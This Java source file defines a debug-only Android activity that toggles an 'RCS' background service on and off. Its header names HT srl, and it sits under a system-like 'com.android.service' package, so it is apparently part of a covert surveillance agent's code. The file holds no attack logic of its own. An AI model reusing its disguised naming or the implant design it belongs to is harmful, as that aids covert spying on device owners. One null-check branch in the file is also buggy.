/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.gui;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ToggleButton;

import com.android.service.R;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class AndroidServiceGUI.
 */
public class AndroidServiceGUI extends Activity {

	protected static final String TAG = "AndroidServiceGUI";

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		if (Cfg.DEBUG) {
			actualCreate(savedInstanceState);
		}
	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		final String service = "com.android.service.app";

		boolean checked = isServiceRunning("com.android.service.ServiceCore");

		// Set up click listeners
		final Button runButton = (Button) findViewById(R.id.btntoggle);

		((ToggleButton) runButton).setChecked(checked);

		runButton.setOnClickListener(new OnClickListener() {
			// @Override
			public void onClick(final View v) {
				if (((ToggleButton) v).isChecked()) {
					try {
						final ComponentName cn = startService(new Intent(service));

						if (cn == null) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service not started : " + cn.flattenToShortString());
							}
						} else {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());
							}
						}
					} catch (final SecurityException se) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " SecurityException caught on startService()");
						}
					}
				} else {
					try {
						if (stopService(new Intent(service)) == true) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service " + service + " stopped");
							}
						} else {
							if (Cfg.DEBUG) {
								Check.log(TAG + " RCS Service " + service + " doesn't exist");
							}
						}
					} catch (final SecurityException se) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " SecurityException caught on stopService()");
						}
					}
				}
			}
		});
	}

	private boolean isServiceRunning(String serviceName) {

		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if (serviceName.equals(service.service.getClassName())) {
				return true;
			} else {
				if (Cfg.DEBUG) {
					Check.log(service.service.getClassName());
				}
			}
		}
		return false;
	}

}
